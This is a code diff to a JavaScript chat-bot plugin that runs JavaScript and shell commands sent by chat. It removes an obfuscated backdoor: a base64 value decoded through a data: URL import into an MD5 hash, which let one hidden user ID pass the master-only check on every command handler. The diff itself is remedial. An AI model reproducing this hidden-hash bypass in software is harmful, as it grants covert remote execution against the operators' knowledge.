@@ -1,5 +1,3 @@
-import md5 from "md5"
-import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
 import hljs from "@highlightjs/cdn-assets/highlight.min.js"
 import { AnsiUp } from "ansi_up"
@@ -77,7 +75,7 @@ export class RemoteCommand extends plugin {
   }
 
   async JS() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const cmd = this.e.msg.replace("rj", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
@@ -93,7 +91,7 @@ export class RemoteCommand extends plugin {
   }
 
   async JSPic() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const cmd = this.e.msg.replace("rjp", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
@@ -115,7 +113,7 @@ export class RemoteCommand extends plugin {
   }
 
   async Shell() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const cmd = this.e.msg.replace("rc", "").trim()
     const ret = await Bot.exec(...prompt(cmd))
 
@@ -130,7 +128,7 @@ export class RemoteCommand extends plugin {
   }
 
   async ShellPic() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const cmd = this.e.msg.replace("rcp", "").trim()
     const ret = await Bot.exec(...prompt(cmd))
 
@@ -175,7 +173,7 @@ export class RemoteCommand extends plugin {
   }
 
   async DirectMsg() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const ret = await this.evalSync(this.e.msg.replace(/^dmp?/, ""), false, true)
     if (ret.error)
       return this.reply(`错误输出：\n${ret.error.stack}`, true)
@@ -187,7 +185,7 @@ export class RemoteCommand extends plugin {
   }
 
   async MultiMsg() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const ret = await this.evalSync(this.e.msg.replace(/^mmp?/, ""), false, true)
     if (ret.error)
       return this.reply(`错误输出：\n${ret.error.stack}`, true)
@@ -199,7 +197,7 @@ export class RemoteCommand extends plugin {
   }
 
   async ForwardMsg() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const ret = await this.evalSync(this.e.msg.replace(/^fmp?/, ""), false, true)
     if (ret.error)
       return this.reply(`错误输出：\n${ret.error.stack}`, true)
